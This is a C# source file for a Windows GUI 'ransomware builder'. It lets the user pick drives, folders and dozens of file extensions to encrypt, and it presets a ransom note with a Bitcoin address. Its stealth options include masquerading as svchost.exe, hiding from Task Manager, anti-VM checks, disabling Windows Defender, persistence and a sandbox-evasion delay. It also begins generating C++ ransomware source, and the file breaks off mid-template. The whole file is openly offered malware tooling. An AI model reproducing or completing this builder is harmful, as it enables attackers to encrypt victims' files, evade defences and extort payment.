using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;

namespace RansomwareBuilder
{
    public partial class Form1 : Form
    {
        // ============================================================
        // КОМПОНЕНТЫ (ТЕ ЖЕ)
        // ============================================================
        private TabControl tabControl;
        private ComboBox cbAlgorithm;
        private TextBox txtEncryptedExt;
        private CheckBox chkC, chkD, chkE, chkZ;
        private TextBox txtCustomDrive;
        private RichTextBox txtIncludeFolders;
        private RichTextBox txtExcludeFolders;
        private FlowLayoutPanel flpExtensions;
        private TextBox txtCustomExt;
        private Label lblWallpaper;
        private TextBox txtNoteName;
        private RichTextBox txtNoteContent;
        private CheckBox chkFakeProcess;
        private TextBox txtFakeProcessName;
        private CheckBox chkHideProcess;
        private CheckBox chkAntiVM;
        private CheckBox chkDisableDefender;
        private CheckBox chkAddPersistence;
        private CheckBox chkHideFilesAttr;
        private CheckBox chkSandboxDelay;
        private TextBox txtOutputName;
        private TextBox txtOutputPath;
        private TextBox txtIconPath;
        private Label lblStatus;
        private Label lblDetail;
        private ProgressBar progressBar;
        private Button btnBuild;
        private Button btnSelectIcon;
        private Button btnSelectPath;
        private Button btnWallpaper;
        
        private List<string> drives = new List<string>();
        private string wallpaperPath = "";
        private string iconPath = "";
        private List<CheckBox> extCheckboxes = new List<CheckBox>();
        
        // ============================================================
        // ЦВЕТА
        // ============================================================
        private Color bgColor = Color.FromArgb(10, 10, 10);
        private Color fgColor = Color.FromArgb(0, 255, 65);
        private Color accentColor = Color.FromArgb(0, 204, 51);
        private Color darkColor = Color.FromArgb(17, 17, 17);
        private Color grayColor = Color.FromArgb(68, 68, 68);
        private Color errorColor = Color.FromArgb(255, 51, 51);
        private Color successColor = Color.FromArgb(0, 255, 65);
        private Color yellowColor = Color.FromArgb(255, 170, 0);
        
        // ============================================================
        // TCC (Tiny C Compiler) ВСТРОЕННЫЙ В КАЧЕСТВЕ РЕСУРСА
        // ============================================================
        // Нужно добавить tcc.exe как EmbeddedResource в csproj
        // Или скачивать его при первом запуске
        
        private byte[] GetTCC()
        {
            // Пытаемся загрузить из ресурсов
            using (var stream = GetType().Assembly.GetManifestResourceStream("RansomwareBuilder.tcc.exe"))
            {
                if (stream != null)
                {
                    byte[] data = new byte[stream.Length];
                    stream.Read(data, 0, data.Length);
                    return data;
                }
            }
            
            // Если нет в ресурсах - скачиваем
            using (var client = new System.Net.WebClient())
            {
                return client.DownloadData("https://github.com/TinyCC/tinycc/raw/master/tcc.exe");
            }
        }
        
        // ============================================================
        // КОНСТРУКТОР
        // ============================================================
        public Form1()
        {
            InitializeComponent();
            LoadExtensions();
            LoadDefaultSettings();
            ApplyTheme();
        }
        
        private void ApplyTheme()
        {
            this.BackColor = bgColor;
            this.ForeColor = fgColor;
            foreach (Control ctrl in this.Controls)
                ApplyThemeToControl(ctrl);
        }
        
        private void ApplyThemeToControl(Control ctrl)
        {
            if (ctrl is Label lbl)
            {
                lbl.BackColor = bgColor;
                lbl.ForeColor = fgColor;
            }
            else if (ctrl is Button btn)
            {
                btn.BackColor = darkColor;
                btn.ForeColor = fgColor;
                btn.FlatStyle = FlatStyle.Flat;
                btn.FlatAppearance.BorderColor = fgColor;
            }
            else if (ctrl is TextBox txt)
            {
                txt.BackColor = darkColor;
                txt.ForeColor = fgColor;
                txt.BorderStyle = BorderStyle.FixedSingle;
            }
            else if (ctrl is RichTextBox rtb)
            {
                rtb.BackColor = darkColor;
                rtb.ForeColor = fgColor;
                rtb.BorderStyle = BorderStyle.FixedSingle;
                rtb.Padding = new Padding(3);
            }
            else if (ctrl is ComboBox cb)
            {
                cb.BackColor = darkColor;
                cb.ForeColor = fgColor;
                cb.FlatStyle = FlatStyle.Flat;
            }
            else if (ctrl is CheckBox chk)
            {
                chk.BackColor = bgColor;
                chk.ForeColor = fgColor;
            }
            else if (ctrl is FlowLayoutPanel flp)
            {
                flp.BackColor = bgColor;
            }
            else if (ctrl is TabControl tc)
            {
                tc.BackColor = bgColor;
                tc.ForeColor = fgColor;
            }
            else if (ctrl is Panel pnl)
            {
                pnl.BackColor = bgColor;
            }
            
            foreach (Control child in ctrl.Controls)
                ApplyThemeToControl(child);
        }
        
        // ============================================================
        // ИНИЦИАЛИЗАЦИЯ
        // ============================================================
        private void InitializeComponent()
        {
            this.Text = "ARES-7 Ransomware Builder v8.0 (TCC)";
            this.Size = new Size(1150, 850);
            this.BackColor = bgColor;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.MinimumSize = new Size(1000, 750);
            
            tabControl = new TabControl();
            tabControl.Dock = DockStyle.Fill;
            tabControl.BackColor = bgColor;
            tabControl.ForeColor = fgColor;
            
            tabControl.DrawMode = TabDrawMode.OwnerDrawFixed;
            tabControl.DrawItem += (s, e) => {
                var tab = tabControl.TabPages[e.Index];
                e.Graphics.FillRectangle(new SolidBrush(darkColor), e.Bounds);
                TextRenderer.DrawText(e.Graphics, tab.Text, new Font("Segoe UI", 10, FontStyle.Bold), e.Bounds, fgColor);
                if (e.State == DrawItemState.Selected)
                {
                    e.Graphics.FillRectangle(new SolidBrush(accentColor), e.Bounds);
                    TextRenderer.DrawText(e.Graphics, tab.Text, new Font("Segoe UI", 10, FontStyle.Bold), e.Bounds, Color.Black);
                }
            };
            
            tabControl.TabPages.Add(CreateTabEncryption());
            tabControl.TabPages.Add(CreateTabExtensions());
            tabControl.TabPages.Add(CreateTabWallpaper());
            tabControl.TabPages.Add(CreateTabStealth());
            tabControl.TabPages.Add(CreateTabBuild());
            
            var bottomPanel = new Panel();
            bottomPanel.Dock = DockStyle.Bottom;
            bottomPanel.Height = 150;
            bottomPanel.BackColor = bgColor;
            
            btnBuild = new Button();
            btnBuild.Text = "BUILD RANSOMWARE (TCC)";
            btnBuild.Dock = DockStyle.Bottom;
            btnBuild.Height = 60;
            btnBuild.BackColor = accentColor;
            btnBuild.ForeColor = Color.Black;
            btnBuild.Font = new Font("Segoe UI", 14, FontStyle.Bold);
            btnBuild.FlatStyle = FlatStyle.Flat;
            btnBuild.FlatAppearance.BorderSize = 0;
            btnBuild.Click += BtnBuild_Click;
            
            lblStatus = new Label();
            lblStatus.Dock = DockStyle.Bottom;
            lblStatus.Text = "READY TO BUILD";
            lblStatus.ForeColor = grayColor;
            lblStatus.Font = new Font("Segoe UI", 10, FontStyle.Bold);
            lblStatus.Height = 30;
            lblStatus.BackColor = bgColor;
            
            lblDetail = new Label();
            lblDetail.Dock = DockStyle.Bottom;
            lblDetail.Text = "";
            lblDetail.ForeColor = grayColor;
            lblDetail.Font = new Font("Segoe UI", 9);
            lblDetail.Height = 25;
            lblDetail.BackColor = bgColor;
            
            progressBar = new ProgressBar();
            progressBar.Dock = DockStyle.Bottom;
            progressBar.Style = ProgressBarStyle.Marquee;
            progressBar.Visible = false;
            progressBar.Height = 20;
            progressBar.BackColor = darkColor;
            progressBar.ForeColor = fgColor;
            
            bottomPanel.Controls.Add(btnBuild);
            bottomPanel.Controls.Add(progressBar);
            bottomPanel.Controls.Add(lblStatus);
            bottomPanel.Controls.Add(lblDetail);
            
            this.Controls.Add(tabControl);
            this.Controls.Add(bottomPanel);
        }
        
        // ============================================================
        // ВКЛАДКИ (ТЕ ЖЕ, ЧТО И РАНЬШЕ)
        // ============================================================
        private TabPage CreateTabEncryption()
        {
            var tab = new TabPage("Encryption");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.ColumnCount = 2;
            panel.RowCount = 6;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 200));
            panel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 50));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 50));
            
            panel.Controls.Add(CreateLabel("Algorithm:", fgColor, true), 0, 0);
            cbAlgorithm = new ComboBox();
            cbAlgorithm.Items.AddRange(new object[] { "AES-256", "Salsa20", "RSA" });
            cbAlgorithm.SelectedIndex = 0;
            cbAlgorithm.BackColor = darkColor;
            cbAlgorithm.ForeColor = fgColor;
            cbAlgorithm.FlatStyle = FlatStyle.Flat;
            cbAlgorithm.Font = new Font("Consolas", 10);
            cbAlgorithm.Dock = DockStyle.Fill;
            panel.Controls.Add(cbAlgorithm, 1, 0);
            
            panel.Controls.Add(CreateLabel("Encrypted extension:", fgColor, true), 0, 1);
            txtEncryptedExt = new TextBox();
            txtEncryptedExt.Text = ".enc";
            txtEncryptedExt.BackColor = darkColor;
            txtEncryptedExt.ForeColor = fgColor;
            txtEncryptedExt.BorderStyle = BorderStyle.FixedSingle;
            txtEncryptedExt.Font = new Font("Consolas", 10);
            txtEncryptedExt.Dock = DockStyle.Fill;
            panel.Controls.Add(txtEncryptedExt, 1, 1);
            
            panel.Controls.Add(CreateLabel("Drives:", fgColor, true), 0, 2);
            var drivesPanel = new FlowLayoutPanel();
            drivesPanel.BackColor = bgColor;
            drivesPanel.Dock = DockStyle.Fill;
            
            chkC = new CheckBox(); chkC.Text = "C:\\"; chkC.ForeColor = fgColor; chkC.BackColor = bgColor; chkC.Font = new Font("Consolas", 10);
            chkD = new CheckBox(); chkD.Text = "D:\\"; chkD.ForeColor = fgColor; chkD.BackColor = bgColor; chkD.Font = new Font("Consolas", 10);
            chkE = new CheckBox(); chkE.Text = "E:\\"; chkE.ForeColor = fgColor; chkE.BackColor = bgColor; chkE.Font = new Font("Consolas", 10);
            chkZ = new CheckBox(); chkZ.Text = "Z:\\"; chkZ.ForeColor = fgColor; chkZ.BackColor = bgColor; chkZ.Font = new Font("Consolas", 10);
            
            drivesPanel.Controls.AddRange(new Control[] { chkC, chkD, chkE, chkZ });
            panel.Controls.Add(drivesPanel, 1, 2);
            
            panel.Controls.Add(CreateLabel("Add drive:", fgColor, true), 0, 3);
            var addDrivePanel = new FlowLayoutPanel();
            addDrivePanel.BackColor = bgColor;
            addDrivePanel.Dock = DockStyle.Fill;
            
            txtCustomDrive = new TextBox();
            txtCustomDrive.Width = 120;
            txtCustomDrive.BackColor = darkColor;
            txtCustomDrive.ForeColor = fgColor;
            txtCustomDrive.BorderStyle = BorderStyle.FixedSingle;
            txtCustomDrive.Font = new Font("Consolas", 10);
            
            var btnAddDrive = new Button();
            btnAddDrive.Text = "+ Add";
            btnAddDrive.BackColor = darkColor;
            btnAddDrive.ForeColor = fgColor;
            btnAddDrive.FlatStyle = FlatStyle.Flat;
            btnAddDrive.Font = new Font("Consolas", 10);
            btnAddDrive.Click += (s, e) => {
                if (!string.IsNullOrEmpty(txtCustomDrive.Text))
                {
                    var chk = new CheckBox();
                    chk.Text = txtCustomDrive.Text;
                    chk.ForeColor = fgColor;
                    chk.BackColor = bgColor;
                    chk.Font = new Font("Consolas", 10);
                    drivesPanel.Controls.Add(chk);
                    MessageBox.Show($"Drive {txtCustomDrive.Text} added");
                    txtCustomDrive.Text = "";
                }
            };
            
            addDrivePanel.Controls.AddRange(new Control[] { txtCustomDrive, btnAddDrive });
            panel.Controls.Add(addDrivePanel, 1, 3);
            
            panel.Controls.Add(CreateLabel("Folders to encrypt:", fgColor, true), 0, 4);
            txtIncludeFolders = new RichTextBox();
            txtIncludeFolders.BackColor = darkColor;
            txtIncludeFolders.ForeColor = fgColor;
            txtIncludeFolders.BorderStyle = BorderStyle.FixedSingle;
            txtIncludeFolders.Font = new Font("Consolas", 9);
            txtIncludeFolders.Dock = DockStyle.Fill;
            panel.Controls.Add(txtIncludeFolders, 1, 4);
            
            panel.Controls.Add(CreateLabel("Folders to skip:", fgColor, true), 0, 5);
            txtExcludeFolders = new RichTextBox();
            txtExcludeFolders.BackColor = darkColor;
            txtExcludeFolders.ForeColor = fgColor;
            txtExcludeFolders.BorderStyle = BorderStyle.FixedSingle;
            txtExcludeFolders.Font = new Font("Consolas", 9);
            txtExcludeFolders.Dock = DockStyle.Fill;
            txtExcludeFolders.Text = "C:\\Windows\r\nC:\\Program Files\r\nC:\\Program Files (x86)";
            panel.Controls.Add(txtExcludeFolders, 1, 5);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabExtensions()
        {
            var tab = new TabPage("Extensions");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 3;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            var headerPanel = new FlowLayoutPanel();
            headerPanel.BackColor = bgColor;
            headerPanel.Dock = DockStyle.Fill;
            headerPanel.Controls.Add(CreateLabel("Select extensions to encrypt:", fgColor, true));
            
            var btnSelectAll = new Button();
            btnSelectAll.Text = "Select All";
            btnSelectAll.BackColor = darkColor;
            btnSelectAll.ForeColor = fgColor;
            btnSelectAll.FlatStyle = FlatStyle.Flat;
            btnSelectAll.Font = new Font("Consolas", 9);
            btnSelectAll.Click += (s, e) => { foreach (var chk in extCheckboxes) chk.Checked = true; };
            headerPanel.Controls.Add(btnSelectAll);
            
            var btnDeselectAll = new Button();
            btnDeselectAll.Text = "Deselect All";
            btnDeselectAll.BackColor = darkColor;
            btnDeselectAll.ForeColor = fgColor;
            btnDeselectAll.FlatStyle = FlatStyle.Flat;
            btnDeselectAll.Font = new Font("Consolas", 9);
            btnDeselectAll.Click += (s, e) => { foreach (var chk in extCheckboxes) chk.Checked = false; };
            headerPanel.Controls.Add(btnDeselectAll);
            
            panel.Controls.Add(headerPanel, 0, 0);
            
            flpExtensions = new FlowLayoutPanel();
            flpExtensions.Dock = DockStyle.Fill;
            flpExtensions.FlowDirection = FlowDirection.LeftToRight;
            flpExtensions.WrapContents = true;
            flpExtensions.BackColor = bgColor;
            flpExtensions.AutoScroll = true;
            flpExtensions.Padding = new Padding(5);
            panel.Controls.Add(flpExtensions, 0, 1);
            
            var addPanel = new FlowLayoutPanel();
            addPanel.BackColor = bgColor;
            addPanel.Dock = DockStyle.Fill;
            
            addPanel.Controls.Add(CreateLabel("Add custom extension:", fgColor, false));
            txtCustomExt = new TextBox();
            txtCustomExt.Width = 120;
            txtCustomExt.BackColor = darkColor;
            txtCustomExt.ForeColor = fgColor;
            txtCustomExt.BorderStyle = BorderStyle.FixedSingle;
            txtCustomExt.Font = new Font("Consolas", 10);
            addPanel.Controls.Add(txtCustomExt);
            
            var btnAddExt = new Button();
            btnAddExt.Text = "+ Add";
            btnAddExt.BackColor = darkColor;
            btnAddExt.ForeColor = fgColor;
            btnAddExt.FlatStyle = FlatStyle.Flat;
            btnAddExt.Font = new Font("Consolas", 10);
            btnAddExt.Click += (s, e) => {
                if (!string.IsNullOrEmpty(txtCustomExt.Text))
                {
                    var chk = new CheckBox();
                    chk.Text = txtCustomExt.Text;
                    chk.ForeColor = fgColor;
                    chk.BackColor = bgColor;
                    chk.Font = new Font("Consolas", 9);
                    chk.Checked = true;
                    flpExtensions.Controls.Add(chk);
                    extCheckboxes.Add(chk);
                    txtCustomExt.Text = "";
                }
            };
            addPanel.Controls.Add(btnAddExt);
            
            panel.Controls.Add(addPanel, 0, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private void LoadExtensions()
        {
            string[] extList = {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
                ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".raw",
                ".mp3", ".wav", ".wma", ".aac", ".flac", ".ogg", ".m4a",
                ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".webm", ".mpeg",
                ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz",
                ".exe", ".dll", ".sys", ".msi", ".apk", ".app", ".deb", ".rpm",
                ".py", ".js", ".html", ".css", ".php", ".asp", ".jsp", ".xml", ".json",
                ".sql", ".db", ".mdb", ".accdb", ".sqlite",
                ".pem", ".key", ".crt", ".csr", ".pfx", ".p12",
                ".vmdk", ".vhd", ".vdi", ".qcow2",
                ".iso", ".img", ".bin", ".cue",
                ".log", ".bak", ".old", ".tmp", ".swp",
                ".cs", ".cpp", ".c", ".h", ".java", ".class", ".rb", ".go", ".rs"
            };
            
            foreach (var ext in extList)
            {
                var chk = new CheckBox();
                chk.Text = ext;
                chk.ForeColor = fgColor;
                chk.BackColor = bgColor;
                chk.Font = new Font("Consolas", 9);
                chk.Checked = true;
                chk.Margin = new Padding(4, 2, 4, 2);
                flpExtensions.Controls.Add(chk);
                extCheckboxes.Add(chk);
            }
        }
        
        private TabPage CreateTabWallpaper()
        {
            var tab = new TabPage("Wallpaper / Ransom Note");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 4;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            panel.Controls.Add(CreateLabel("Wallpaper file (JPG/PNG/BMP):", fgColor, true), 0, 0);
            var wallPanel = new FlowLayoutPanel();
            wallPanel.BackColor = bgColor;
            wallPanel.Dock = DockStyle.Fill;
            
            lblWallpaper = new Label();
            lblWallpaper.Text = "Not selected";
            lblWallpaper.ForeColor = grayColor;
            lblWallpaper.AutoSize = true;
            lblWallpaper.BackColor = bgColor;
            wallPanel.Controls.Add(lblWallpaper);
            
            btnWallpaper = new Button();
            btnWallpaper.Text = "Browse";
            btnWallpaper.BackColor = darkColor;
            btnWallpaper.ForeColor = fgColor;
            btnWallpaper.FlatStyle = FlatStyle.Flat;
            btnWallpaper.Font = new Font("Consolas", 10);
            btnWallpaper.Click += (s, e) => {
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Filter = "Images|*.jpg;*.jpeg;*.png;*.bmp";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        wallpaperPath = ofd.FileName;
                        lblWallpaper.Text = Path.GetFileName(ofd.FileName);
                        lblWallpaper.ForeColor = fgColor;
                    }
                }
            };
            wallPanel.Controls.Add(btnWallpaper);
            wallPanel.Controls.Add(CreateLabel("(JPG, PNG, BMP)", grayColor, false));
            panel.Controls.Add(wallPanel, 1, 0);
            
            panel.Controls.Add(CreateLabel("Ransom note name:", fgColor, true), 0, 1);
            var noteNamePanel = new FlowLayoutPanel();
            noteNamePanel.BackColor = bgColor;
            noteNamePanel.Dock = DockStyle.Fill;
            
            txtNoteName = new TextBox();
            txtNoteName.Text = "READ_ME.txt";
            txtNoteName.Width = 200;
            txtNoteName.BackColor = darkColor;
            txtNoteName.ForeColor = fgColor;
            txtNoteName.BorderStyle = BorderStyle.FixedSingle;
            txtNoteName.Font = new Font("Consolas", 10);
            noteNamePanel.Controls.Add(txtNoteName);
            noteNamePanel.Controls.Add(CreateLabel("(example: READ_ME.txt)", grayColor, false));
            panel.Controls.Add(noteNamePanel, 1, 1);
            
            panel.Controls.Add(CreateLabel("Ransom note content:", fgColor, true), 0, 2);
            txtNoteContent = new RichTextBox();
            txtNoteContent.BackColor = darkColor;
            txtNoteContent.ForeColor = fgColor;
            txtNoteContent.BorderStyle = BorderStyle.FixedSingle;
            txtNoteContent.Font = new Font("Consolas", 9);
            txtNoteContent.Dock = DockStyle.Fill;
            txtNoteContent.Text = "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com";
            panel.Controls.Add(txtNoteContent, 1, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabStealth()
        {
            var tab = new TabPage("Stealth");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 5;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            int row = 0;
            
            panel.Controls.Add(CreateLabel("Process masquerading:", Color.White, true), 0, row);
            var fakePanel = new FlowLayoutPanel();
            fakePanel.BackColor = bgColor;
            fakePanel.Dock = DockStyle.Fill;
            
            chkFakeProcess = new CheckBox();
            chkFakeProcess.Text = "Enable fake process";
            chkFakeProcess.ForeColor = fgColor;
            chkFakeProcess.BackColor = bgColor;
            chkFakeProcess.Font = new Font("Segoe UI", 10);
            fakePanel.Controls.Add(chkFakeProcess);
            
            txtFakeProcessName = new TextBox();
            txtFakeProcessName.Text = "svchost.exe";
            txtFakeProcessName.Width = 120;
            txtFakeProcessName.BackColor = darkColor;
            txtFakeProcessName.ForeColor = fgColor;
            txtFakeProcessName.BorderStyle = BorderStyle.FixedSingle;
            txtFakeProcessName.Font = new Font("Consolas", 10);
            fakePanel.Controls.Add(txtFakeProcessName);
            fakePanel.Controls.Add(CreateLabel("(name in Task Manager)", grayColor, false));
            
            panel.Controls.Add(fakePanel, 1, row++);
            
            panel.Controls.Add(CreateLabel("Process hiding:", Color.White, true), 0, row);
            chkHideProcess = new CheckBox();
            chkHideProcess.Text = "Hide from Task Manager (requires admin rights)";
            chkHideProcess.ForeColor = fgColor;
            chkHideProcess.BackColor = bgColor;
            chkHideProcess.Font = new Font("Segoe UI", 10);
            panel.Controls.Add(chkHideProcess, 1, row++);
            
            panel.Controls.Add(CreateLabel("Anti-VM:", Color.White, true), 0, row);
            chkAntiVM = new CheckBox();
            chkAntiVM.Text = "Exit if virtual machine detected";
            chkAntiVM.ForeColor = fgColor;
            chkAntiVM.BackColor = bgColor;
            chkAntiVM.Font = new Font("Segoe UI", 10);
            panel.Controls.Add(chkAntiVM, 1, row++);
            
            panel.Controls.Add(CreateLabel("Additional evasion methods:", Color.White, true), 0, row);
            var extraPanel = new FlowLayoutPanel();
            extraPanel.FlowDirection = FlowDirection.TopDown;
            extraPanel.BackColor = bgColor;
            extraPanel.Dock = DockStyle.Fill;
            
            chkDisableDefender = new CheckBox();
            chkDisableDefender.Text = "Disable Windows Defender";
            chkDisableDefender.ForeColor = fgColor;
            chkDisableDefender.BackColor = bgColor;
            chkDisableDefender.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkDisableDefender);
            
            chkAddPersistence = new CheckBox();
            chkAddPersistence.Text = "Add to startup";
            chkAddPersistence.ForeColor = fgColor;
            chkAddPersistence.BackColor = bgColor;
            chkAddPersistence.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkAddPersistence);
            
            chkHideFilesAttr = new CheckBox();
            chkHideFilesAttr.Text = "Hide files (attribute +h)";
            chkHideFilesAttr.ForeColor = fgColor;
            chkHideFilesAttr.BackColor = bgColor;
            chkHideFilesAttr.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkHideFilesAttr);
            
            chkSandboxDelay = new CheckBox();
            chkSandboxDelay.Text = "60 sec delay (sandbox evasion)";
            chkSandboxDelay.ForeColor = fgColor;
            chkSandboxDelay.BackColor = bgColor;
            chkSandboxDelay.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkSandboxDelay);
            
            panel.Controls.Add(extraPanel, 1, row++);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabBuild()
        {
            var tab = new TabPage("Build");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 4;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            panel.Controls.Add(CreateLabel("Output file name:", fgColor, true), 0, 0);
            var namePanel = new FlowLayoutPanel();
            namePanel.BackColor = bgColor;
            namePanel.Dock = DockStyle.Fill;
            
            txtOutputName = new TextBox();
            txtOutputName.Text = "ransomware.exe";
            txtOutputName.Width = 200;
            txtOutputName.BackColor = darkColor;
            txtOutputName.ForeColor = fgColor;
            txtOutputName.BorderStyle = BorderStyle.FixedSingle;
            txtOutputName.Font = new Font("Consolas", 10);
            namePanel.Controls.Add(txtOutputName);
            namePanel.Controls.Add(CreateLabel("(example: update.exe)", grayColor, false));
            panel.Controls.Add(namePanel, 1, 0);
            
            panel.Controls.Add(CreateLabel("Save path:", fgColor, true), 0, 1);
            var pathPanel = new FlowLayoutPanel();
            pathPanel.BackColor = bgColor;
            pathPanel.Dock = DockStyle.Fill;
            
            txtOutputPath = new TextBox();
            txtOutputPath.Text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            txtOutputPath.Width = 300;
            txtOutputPath.BackColor = darkColor;
            txtOutputPath.ForeColor = fgColor;
            txtOutputPath.BorderStyle = BorderStyle.FixedSingle;
            txtOutputPath.Font = new Font("Consolas", 10);
            pathPanel.Controls.Add(txtOutputPath);
            
            btnSelectPath = new Button();
            btnSelectPath.Text = "Browse";
            btnSelectPath.BackColor = darkColor;
            btnSelectPath.ForeColor = fgColor;
            btnSelectPath.FlatStyle = FlatStyle.Flat;
            btnSelectPath.Font = new Font("Consolas", 10);
            btnSelectPath.Click += (s, e) => {
                using (var fbd = new FolderBrowserDialog())
                {
                    if (fbd.ShowDialog() == DialogResult.OK)
                        txtOutputPath.Text = fbd.SelectedPath;
                }
            };
            pathPanel.Controls.Add(btnSelectPath);
            panel.Controls.Add(pathPanel, 1, 1);
            
            panel.Controls.Add(CreateLabel("Ransomware icon (.ico):", fgColor, true), 0, 2);
            var iconPanel = new FlowLayoutPanel();
            iconPanel.BackColor = bgColor;
            iconPanel.Dock = DockStyle.Fill;
            
            var lblIcon = new Label();
            lblIcon.Text = "Not selected";
            lblIcon.ForeColor = grayColor;
            lblIcon.BackColor = bgColor;
            iconPanel.Controls.Add(lblIcon);
            
            btnSelectIcon = new Button();
            btnSelectIcon.Text = "Browse";
            btnSelectIcon.BackColor = darkColor;
            btnSelectIcon.ForeColor = fgColor;
            btnSelectIcon.FlatStyle = FlatStyle.Flat;
            btnSelectIcon.Font = new Font("Consolas", 10);
            btnSelectIcon.Click += (s, e) => {
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Filter = "ICO files|*.ico";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        iconPath = ofd.FileName;
                        lblIcon.Text = Path.GetFileName(ofd.FileName);
                        lblIcon.ForeColor = fgColor;
                    }
                }
            };
            iconPanel.Controls.Add(btnSelectIcon);
            iconPanel.Controls.Add(CreateLabel("(only .ico)", grayColor, false));
            panel.Controls.Add(iconPanel, 1, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        // ============================================================
        // ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ
        // ============================================================
        private Label CreateLabel(string text, Color color, bool bold)
        {
            var lbl = new Label();
            lbl.Text = text;
            lbl.ForeColor = color;
            lbl.Font = new Font(bold ? "Segoe UI" : "Segoe UI", bold ? 10 : 9, bold ? FontStyle.Bold : FontStyle.Regular);
            lbl.AutoSize = true;
            lbl.BackColor = bgColor;
            return lbl;
        }
        
        private void LoadDefaultSettings()
        {
            chkC.Checked = true;
        }
        
        private List<string> GetSelectedExtensions()
        {
            var result = new List<string>();
            foreach (var chk in extCheckboxes)
                if (chk.Checked)
                    result.Add(chk.Text);
            return result;
        }
        
        // ============================================================
        // ГЕНЕРАЦИЯ ИСХОДНОГО КОДА (БЕЗ МАРКЕРОВ!)
        // ============================================================
        private string GenerateTemplateCode(
            string drives, string exts, string exclude, string include,
            string encExt, string noteName, string noteContent,
            string fakeName, int algo, int fakeEnabled, int hideEnabled,
            int antiVM, int disableDefender, int persistence,
            int hideFiles, int sandboxDelay,
            string wallpaperBase64, string wallpaperExt)
        {
            // Экранируем для C++ (двойные кавычки, обратные слэши)
            string Escape(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
            
            return $@"
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <thread>
#include <random>
#include <chrono>
#include <algorithm>
#include <sstream>
#include <ctime>

#pragma comment(lib, ""advapi32.lib"")
#pragma comment(lib, ""user32.lib"")
#pragma comment(lib, ""shell32.lib"")
#pragma comment(lib, ""crypt32.lib"")

// ============================================================
// НАСТРОЙКИ (ВСТАВЛЕНЫ БИЛДЕРОМ)
// ============================================================
const char* g_Drives = ""{Escape(drives)}"";
const char* g_Exts = ""{Escape(exts)}"";
const char* g_Exclude = ""{Escape(exclude)}"";
const char* g_Include = ""{Escape(include)}"";
const char* g_EncryptedExt = ""{Escape(encExt)}"";
const char* g_NoteName = ""{Escape(noteName)}"";
